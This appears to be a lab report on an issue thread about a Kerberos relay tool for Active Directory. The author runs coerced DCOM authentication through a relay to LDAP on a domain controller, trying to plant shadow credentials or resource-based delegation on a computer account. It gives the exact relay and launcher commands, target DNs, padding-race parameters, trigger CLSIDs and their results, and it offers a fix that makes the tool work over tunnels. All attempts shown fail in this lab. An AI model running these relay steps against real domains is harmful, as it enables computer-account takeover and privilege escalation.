# KrbRelay BOF: my lab results, why the LDAP write does not land here

Thanks again for the help. This is what I ran in my own lab and what I see, with
the exact commands and output. Everything here is lab only.

## My environment

- Domain mayyhem.com. DC is dc.mayyhem.com (10.112.0.70), Server 2022, build
  10.0.20348.5622. LDAP signing is not required. LDAPS channel binding is not
  enforced. I verified both in the registry and with a behavior test.
- Server victim: PS1-LAB, Server 2022. Client victim: PS1-DEV, Windows 11, UBR 9457.
- The relay runs on my Kali box. In the lab the exe connects straight to the relay.

## Short version

On my DCs the write never lands, for two separate reasons that both hold here. The
padded race write returns result=1 at every padding, because my DC processes the
pipelined write before the bind commits. And the coerced context is always packet
integrity, so the no-race post-bind write resets. No trigger on a Server 2022 or on
my Windows 11 gives a level-2 context.

## Attempt 1: padded race, shadow credentials (main)

Relay:

```
python3 relay_server.py shadowcred --port 9008 \
  --ldap-host dc.mayyhem.com --ldap-address 10.112.0.70 --ldap-port 389 \
  --domain mayyhem.com --machine PS1-LAB \
  --target-dn "CN=PS1-LAB,CN=Computers,DC=mayyhem,DC=com" \
  --pfx-out victim.pfx --padding-count 8
```

Exe on PS1-LAB:

```
krbrelay.exe <relay_ip> 9008 ldap/dc.mayyhem.com 127.0.0.1 7989 "{A9819296-E5B3-4E67-8226-5E72CE9E1FB7}"
```

Relay output:

```
[*] LDAP bind leg 1: result=14, serverSaslCreds=139 bytes
[*] LDAP bind leg 2: result=0, serverSaslCreds=0 bytes
[*] LDAP final bind succeeded; validating the queued directory write
[*] ShadowCred candidate result=1: 000004DC: LdapErr: ... a successful bind must be completed on the connection.
[-] Relay failed: queued ShadowCred exchange returned no successful KCL write
```

The bind succeeds. Every one of the padding_count identical writes returns result=1.
I swept padding from 2 up with no change.

## Attempt 2: padded race, RBCD (main)

RBCD pads in a different shape. It sends one msDS-AllowedToActOnBehalfOfOtherIdentity
write whose descriptor repeats the same trustee ACE padding_count times. Shadow
credentials instead sends the same write padding_count times. Both try to delay the
write authorization check until the bind commits.

I ran the rbcd subcommand with --delegate-sid and --padding-count 8. Same outcome,
result=1. On my DC that single write is processed before the bind, so the larger
descriptor does not help. The parse time buys a delay only on a DC that works the
bind on another worker at the same time.

## The deciding test: a minimal client isolates the DC behavior

To separate the DC from the tool, I wrote a small Kerberos LDAP client. It pipelines
the write before the final bind leg, the same shape as the relay. It reads each
result code. It uses a no-integrity context, so a write that runs after the bind
returns a normal code instead of a reset. result=1 means the write ran before the
bind committed.

Race, writes then bind in one TCP segment, run as a low-privilege user:

```
[run 1] bind=0  modify_result_codes={1: 2}    post_bind_wins=[]
[run 1] bind=0  modify_result_codes={1: 8}    post_bind_wins=[]
[run 1] bind=0  modify_result_codes={1: 32}   post_bind_wins=[]
[run 1] bind=0  modify_result_codes={1: 64}   post_bind_wins=[]
[run 1] bind=0  modify_result_codes={1: 128}  post_bind_wins=[]
[run 1] bind=0  modify_result_codes={1: 512}  post_bind_wins=[]
```

Every write before the bind returns result=1, at padding 2 through 512. No write
lands after the bind at any padding.

Same client, bind first and then the write, no-integrity context:

```
[run 1] bind=0  modify_result_codes={21: 1}  post_bind_wins=[1]
```

Here the write runs after the bind and returns a normal post-bind code, 21 from my
dummy value, not result=1 and not a reset. So my DC does take a post-bind write, but
only with a no-integrity context.

My read: my DC processes one connection's pipelined requests in byte order. The bind
is last in the stream, so it commits last, and no write lands after it. Padding only
adds more pre-bind writes. For your padding to work, your DC has to process one
connection's requests at the same time on more than one worker. Then a padded write
can finish its check after the bind commits. That is a DC property, not a client
lever, which fits that it works on yours and not mine.

## Why there is no level-2 context here

I surveyed every DCOM trigger backed by a LocalSystem service and read the coerced
auth level for each.

On PS1-LAB (Server 2022): 180 triggers, 86 at auth_level=5, 2 at level 6, zero at
level 2. AxInstSv returns level 5 here, not level 2:

```
{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}  svc=AxInstSv start=Manual  => [probe] coerced auth_type=16 auth_level=5 token0=0x6e
```

On PS1-DEV (Windows 11, UBR 9457): AxInstSv also returns auth_level=5, not level 2.

So no victim here produces a level-2 context, client or server. That is what blocks
the post-bind path. An integrity context makes the DC reject the unsigned write.

## Direct-kerberos post-bind attempt (ldaps-direct-kerberos branch)

For completeness, the low-layer path with AxInstSv:

```
[*] Relayed context: auth_type=16 auth_level=5 token[0]=0x6e
[*] LDAP bind leg 1: result=14, serverSaslCreds=139 bytes
[*] LDAP bind leg 2: result=0, serverSaslCreds=0 bytes
[*] LDAP final bind succeeded; validating the queued directory write
[-] Relay failed: [Errno 104] Connection reset by peer
```

The context is auth_level=5, so the bind succeeds and the DC resets the unsigned
post-bind write.

## A transport bug I hit, with a fix

Over an rportfwd plus SOCKS path the two sequential bridge connections get
duplicated or reordered. A preflight then lands on the token accept, and the relay
fails with "unexpected bridge message for current state". Over a direct connection
it does not happen. I made the relay skip any extra preflight connection and wait
for the token connection, which fixed it over the tunnel. I can share that diff.

## Bottom line

On my DCs the write does not land. The race is serialized, so result=1 at any
padding. The context is always integrity, so the post-bind write resets, and no
trigger gives level 2 here. The likely difference from your setup is that your DC
works a connection concurrently and your victims return a level-2 context. My DC
build is 20348.5622 and my Windows 11 is UBR 9457, in case a build comparison helps.
